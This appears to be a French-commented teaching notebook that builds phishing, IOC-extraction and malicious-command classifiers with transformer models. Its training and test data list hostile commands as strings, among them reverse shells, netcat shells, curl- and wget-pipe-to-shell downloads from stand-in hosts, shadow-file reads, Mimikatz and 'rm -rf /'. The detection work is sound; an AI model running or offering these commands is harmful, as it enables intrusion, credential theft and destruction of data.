In [ ]:
import pandas as pd
import numpy as np
import torch
from transformers import pipeline, AutoTokenizer, AutoModel
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report

In [ ]:
# ==============================================================================
# OPTION 1 : Modèle spécialisé fine-tuné (Pipeline text-classification)
# Remplacement direct : plus rapide et plus précis que le zero-shot
# ==============================================================================
print("=" * 70)
print("OPTION 1 : Modèle dédié au Phishing / Spam (text-classification)")
print("=" * 70)

# Modèle fine-tuné spécifiquement pour la classification de messages suspects
phish_classifier = pipeline(
    "text-classification", 
    model="ealvaradob/bert-finetuned-phishing"
)

emails = [
    "URGENT: Your direct deposit failed. Click here to re-enter banking credentials.",
    "Team, please find attached the meeting notes for our sprint."
]

for res, text in zip(phish_classifier(emails), emails):
    print(f"Label: {res['label']} (score: {res['score']:.4f}) | Texte: {text[:60]}...")

In [ ]:
# ==============================================================================
# OPTION 2 : Token Classification / NER Cyber (Extraction d'IOCs)
# Au lieu de dire "malveillant", on extrait les composants techniques du log/rapport
# ==============================================================================
print("\n" + "=" * 70)
print("OPTION 2 : Extraction d'entités nommées cyber (NER / IOC extraction)")
print("=" * 70)

# Extraction d'artefacts cyber (attaques, outils, vulnérabilités)
ner_pipeline = pipeline(
    "token-classification", 
    model="dslim/bert-base-NER", 
    aggregation_strategy="simple"
)

cve_report = "Attacker deployed Mimikatz after exploiting CVE-2021-44228 via 192.168.1.50."
entities = ner_pipeline(cve_report)

print(f"Rapport brut : {cve_report}")
for ent in entities:
    print(f"Entité trouvée: {ent['word']:<15} | Type: {ent['entity_group']:<6} | Score: {ent['score']:.3f}")

In [ ]:
# ==============================================================================
# OPTION 3 : Feature Extraction (Embeddings) + Classifieur Supervisé (Ex: LogisticRegression)
# Idéal quand on a quelques dizaines d'exemples étiquetés (Few-Shot supervisé)
# ==============================================================================
print("\n" + "=" * 70)
print("OPTION 3 : Embeddings denses + Régression Logistique")
print("=" * 70)

train_logs = [
    "Accepted publickey for ubuntu from 10.0.0.1 port 22",
    "sudo: pam_unix(sudo:session): session opened for user root",
    "Failed password for invalid user admin from 203.0.113.5 port 44211",
    "POST /cgi-bin/test.sh?cmd=cat%20/etc/passwd HTTP/1.1 404",
]
train_labels = [0, 0, 1, 1]  # 0: Bénin, 1: Suspect

test_logs = [
    "Accepted password for user deploy from 10.0.0.2 port 51234",
    "GET /../../etc/shadow HTTP/1.1 403"
]
test_labels = [0, 1]

# Extraction des représentations via un encodeur compact
tokenizer = AutoTokenizer.from_pretrained("sentence-transformers/all-MiniLM-L6-v2")
encoder = AutoModel.from_pretrained("sentence-transformers/all-MiniLM-L6-v2")

def encode_texts(texts):
    tokens = tokenizer(texts, padding=True, truncation=True, return_tensors="pt")
    with torch.no_grad():
        out = encoder(**tokens)
        mask = tokens["attention_mask"].unsqueeze(-1)
        # Mean pooling
        emb = (out.last_hidden_state * mask).sum(dim=1) / mask.sum(dim=1)
    return emb.numpy()

X_train = encode_texts(train_logs)
X_test = encode_texts(test_logs)

# Classifieur classique entraîné sur les embeddings
clf = LogisticRegression()
clf.fit(X_train, train_labels)
preds = clf.predict(X_test)

print(f"Logs de test évalués : {len(test_logs)}")
for log, pred, truth in zip(test_logs, preds, test_labels):
    print(f"Log: '{log}' -> Prédit: {'Suspect' if pred == 1 else 'Bénin'} (Attendu: {'Suspect' if truth == 1 else 'Bénin'})")

In [ ]:
# ==============================================================================
# OPTION 4 : Finetuner le modèle Transformer sur un petit dataset cyber (Few-Shot)
# ==============================================================================

import torch
import pandas as pd
from datasets import Dataset
from transformers import (
    AutoTokenizer, 
    AutoModelForSequenceClassification, 
    TrainingArguments, 
    Trainer
)
from sklearn.metrics import accuracy_score, precision_recall_fscore_support

# ==============================================================================
# 1. Dataset Cyber d'entraînement et d'évaluation (inline)
# ==============================================================================
train_data = {
    "text": [
        # Bénins (0)
        "sudo systemctl status sshd",
        "ls -la /var/log/nginx/",
        "curl https://api.github.com/repos",
        "cat /etc/hosts",
        "grep -rnw '/home/user' -e 'config'",
        "python3 -m unittest discover tests/",
        # Malveillants / Suspects (1)
        "cat /etc/shadow",
        "curl http://185.220.101.5/payload.sh | bash",
        "nc -lvnp 4444 -e /bin/bash",
        "bash -i >& /dev/tcp/10.0.0.1/9001 0>&1",
        "powershell -ExecutionPolicy Bypass -Command 'Invoke-Mimikatz'",
        "wget -qO- evil-c2.net/dropper | python3"
    ],
    "label": [0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1]
}

eval_data = {
    "text": [
        "sudo apt-get update && sudo apt-get upgrade",
        "cat /etc/passwd",
        "bash -c 'bash -i >& /dev/tcp/192.168.1.100/443 0>&1'",
        "python3 -m http.server 8080"
    ],
    "label": [0, 1, 1, 0]  # passwd est souvent flagged suspect dans ce contexte
}

ds_train = Dataset.from_pandas(pd.DataFrame(train_data))
ds_eval = Dataset.from_pandas(pd.DataFrame(eval_data))

# ==============================================================================
# 2. Tokenisation
# ==============================================================================
MODEL_NAME = "distilbert-base-uncased"
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)

def tokenize_batch(batch):
    return tokenizer(batch["text"], padding="max_length", truncation=True, max_length=64)

ds_train_tok = ds_train.map(tokenize_batch, batched=True)
ds_eval_tok = ds_eval.map(tokenize_batch, batched=True)

# ==============================================================================
# 3. Chargement du modèle avec tête de classification (2 classes)
# ==============================================================================
model = AutoModelForSequenceClassification.from_pretrained(
    MODEL_NAME, 
    num_labels=2,
    id2label={0: "Benign", 1: "Malicious"},
    label2id={"Benign": 0, "Malicious": 1}
)

# Fonction de calcul des métriques
def compute_metrics(eval_pred):
    logits, labels = eval_pred
    preds = logits.argmax(axis=-1)
    acc = accuracy_score(labels, preds)
    precision, recall, f1, _ = precision_recall_fscore_support(labels, preds, average="binary")
    return {"accuracy": acc, "f1": f1, "precision": precision, "recall": recall}

# ==============================================================================
# 4. Configuration et entraînement (Trainer)
# ==============================================================================
training_args = TrainingArguments(
    output_dir="./cyber_finetuned_model",
    num_train_epochs=3,               # 3 époques pour aller très vite en démo
    per_device_train_batch_size=4,
    per_device_eval_batch_size=4,
    learning_rate=2e-5,               # LR classique pour fine-tuning Transformer
    weight_decay=0.01,
    logging_steps=1,
    eval_strategy="epoch",
    save_strategy="no",               # Ne pas encombrer le disque en TP
    use_cpu=not torch.cuda.is_available()
)

trainer = Trainer(
    model=model,
    args=training_args,
    train_dataset=ds_train_tok,
    eval_dataset=ds_eval_tok,
    compute_metrics=compute_metrics,
)

print("=== Début du Fine-Tuning ===")
trainer.train()

# ==============================================================================
# 5. Inférence post-entraînement avec le modèle fine-tuné
# ==============================================================================
print("\n=== Évaluation sur des commandes inconnues ===")
model.eval()

test_commands = [
    "git clone https://github.com/project/repo.git",
    "rm -rf / --no-preserve-root",
    "nc -e /bin/sh 10.10.14.5 1337"
]

inputs = tokenizer(test_commands, padding=True, truncation=True, max_length=64, return_tensors="pt")
if torch.cuda.is_available():
    inputs = {k: v.cuda() for k, v in inputs.items()}
    model = model.cuda()

with torch.no_grad():
    outputs = model(**inputs)
    probs = torch.softmax(outputs.logits, dim=-1)
    predictions = torch.argmax(probs, dim=-1).cpu().numpy()

for cmd, pred, proba in zip(test_commands, predictions, probs):
    label_str = model.config.id2label[pred]
    conf = proba[pred].item()
    print(f"[{label_str}] (confiance: {conf:.4f}) -> {cmd}")